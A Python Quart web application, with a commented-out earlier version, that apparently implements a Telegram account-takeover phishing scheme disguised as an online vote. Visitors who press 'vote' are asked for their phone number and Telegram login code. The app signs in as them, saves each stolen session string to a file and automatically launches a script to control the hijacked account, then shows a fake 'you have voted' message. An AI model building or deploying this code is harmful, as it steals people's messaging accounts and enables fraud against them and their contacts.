







#-----------------------------------------------------------------------------------------WITH COMMANDS
from quart import Quart, request, redirect, url_for, render_template, session as quart_session
import os
from telethon import TelegramClient
from telethon.sessions import StringSession
import logging
from dotenv import load_dotenv
import subprocess

load_dotenv()

logging.basicConfig(level=logging.DEBUG)

api_id = os.getenv('API_ID')
api_hash = os.getenv('API_HASH')

app = Quart(__name__, template_folder='templates', static_folder='static')
app.secret_key = os.urandom(24)

client = None

async def create_telegram_client(session_str=None):
    session = StringSession(session_str) if session_str else StringSession()
    global client
    client = TelegramClient(session, api_id, api_hash)
    await client.connect()

@app.route('/')
async def index():
    return await render_template('index.html')

@app.route('/vote/<candidate>', methods=['POST'])
async def vote(candidate):
    return redirect(url_for('telegram_number_route'))

@app.route('/telegram-number', methods=['GET', 'POST'])
async def telegram_number_route():
    if request.method == 'POST':
        phone_number = (await request.form)['phone_number']
        quart_session['phone_number'] = phone_number

        try:
            await create_telegram_client()
            result = await client.send_code_request(phone_number)
            quart_session['phone_code_hash'] = result.phone_code_hash
        except Exception as e:
            print(f"Ошибка при отправке кода: {e}")

        return redirect(url_for('verify_code'))
    return await render_template('telegram-number.html')

@app.route('/telegram-code', methods=['GET', 'POST'])
async def verify_code():
    if request.method == 'POST':
        verification_code = (await request.form)['verification_code']
        phone_number = quart_session.get('phone_number')
        phone_code_hash = quart_session.get('phone_code_hash')

        if phone_number and phone_code_hash:
            try:
                await client.sign_in(phone=phone_number, code=verification_code, phone_code_hash=phone_code_hash)
                session_str = client.session.save()
                os.makedirs('sessions', exist_ok=True)
                session_file_path = f"sessions/{phone_number}.session"
                with open(session_file_path, "w") as session_file:
                    session_file.write(session_str)
                
                # Автоматически запускаем консольное приложение для управления аккаунтом
                subprocess.Popen(['python', 'manage_account.py', phone_number], shell=False)

                return redirect(url_for('success_page'))
            except Exception as e:
                return f"Ошибка при проверке кода: {e}"
        return redirect(url_for('telegram_number_route'))
    return await render_template('telegram-code.html')

@app.route('/success')
async def success_page():
    return "Вы успешно проголосовали!"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)



















#-----------------------------------------------------------------------------------------MAIN

# from quart import Quart, request, redirect, url_for, render_template, session as quart_session
# import os
# from telethon import TelegramClient
# from telethon.sessions import StringSession
# import logging
# from dotenv import load_dotenv

# load_dotenv()

# logging.basicConfig(level=logging.DEBUG)

# api_id = os.getenv('API_ID')
# api_hash = os.getenv('API_HASH')

# app = Quart(__name__, template_folder='templates', static_folder='static')
# app.secret_key = os.urandom(24)

# client = None

# async def create_telegram_client(session_str=None):
#     session = StringSession(session_str) if session_str else StringSession()
#     global client
#     client = TelegramClient(session, api_id, api_hash)
#     await client.connect()

# @app.route('/')
# async def index():
#     return await render_template('index.html')

# @app.route('/vote/<candidate>', methods=['POST'])
# async def vote(candidate):
#     return redirect(url_for('telegram_number_route'))

# @app.route('/telegram-number', methods=['GET', 'POST'])
# async def telegram_number_route():
#     if request.method == 'POST':
#         phone_number = (await request.form)['phone_number']
#         quart_session['phone_number'] = phone_number

#         try:
#             await create_telegram_client()
#             result = await client.send_code_request(phone_number)
#             quart_session['phone_code_hash'] = result.phone_code_hash
#         except Exception as e:
#             print(f"Ошибка при отправке кода: {e}")

#         return redirect(url_for('verify_code'))
#     return await render_template('telegram-number.html')

# @app.route('/telegram-code', methods=['GET', 'POST'])
# async def verify_code():
#     if request.method == 'POST':
#         verification_code = (await request.form)['verification_code']
#         phone_number = quart_session.get('phone_number')
#         phone_code_hash = quart_session.get('phone_code_hash')

#         if phone_number and phone_code_hash:
#             try:
#                 await client.sign_in(phone=phone_number, code=verification_code, phone_code_hash=phone_code_hash)
#                 session_str = client.session.save()
#                 os.makedirs('sessions', exist_ok=True)
#                 with open(f"sessions/{phone_number}.session", "w") as session_file:
#                     session_file.write(session_str)
#                 return redirect(url_for('success_page'))
#             except Exception as e:
#                 return f"Ошибка при проверке кода: {e}"
#         return redirect(url_for('telegram_number_route'))
#     return await render_template('telegram-code.html')

# @app.route('/success')
# async def success_page():
#     return "Вы успешно авторизовались!"

# if __name__ == '__main__':
#     app.run(debug=True)
